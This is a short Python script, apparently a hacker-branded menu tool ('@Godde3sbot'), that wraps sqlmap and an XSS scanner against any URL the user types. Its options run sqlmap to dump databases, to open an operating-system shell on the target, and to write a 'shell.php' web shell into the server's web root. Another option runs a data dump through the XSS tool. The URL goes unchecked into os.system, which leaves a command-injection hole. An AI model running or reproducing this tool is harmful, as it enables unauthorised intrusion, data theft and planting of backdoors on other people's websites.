import os

def main_menu():
    print(""" 
  ⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿*
  ⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿"
  ⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀ ⠀⠀⠀⠀⣸⣿*
  ⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀⠀⠀⠀⢀⣴⣿⣿⣿"
  ⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀⠀⠠⣴⣿⣿⣿⣿⣿*
  ⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿"
  ⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿*
  ⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿"
  ⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿*
  ⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿"
  ⣿⣿⣿⣿⠃⠀⠀@Godde3sbot⠀ ⠀⠀ ⠀⠀⢸⣿⣿*
    """)
    print("1. SQLI ")
    print("2. XSS ")
    choice = input(" which: ")
    return choice

def sql_injection_menu():
    print(" SQL Injection:")
    print("1. Database extraction ")
    print("2. hack site ")
    print("3. Loose injection ")
    action = input("which: ")
    url = input("url: ")
    execute_sqlmap(action, url)

def xss_menu():
    print(" XSS:")
    print("1. Vulnerability testing ")
    print("2. Information extraction")
    action = input("which : ")
    url = input(" url : ")
    execute_xssrecon(action, url)

def execute_sqlmap(action, url):
    if action == "1":
        os.system(f"sqlmap -u {url} --dbs")
    elif action == "2":
        os.system(f"sqlmap -u {url} --os-shell")
    elif action == "3":
        os.system(f"sqlmap -u {url} --file-write shell.php --file-dest /var/www/html/shell.php")
    else:
        print("invalid ")

def execute_xssrecon(action, url):
    if action == "1":
        os.system(f"xssrecon -u {url}")
    elif action == "2":
        os.system(f"xssrecon -u {url} --dump")
    else:
        print("invalid ")

if __name__ == "__main__":
    while True:
        choice = main_menu()
        if choice == "1":
            sql_injection_menu()
        elif choice == "2":
            xss_menu()
        else:
            print(" invalid ")
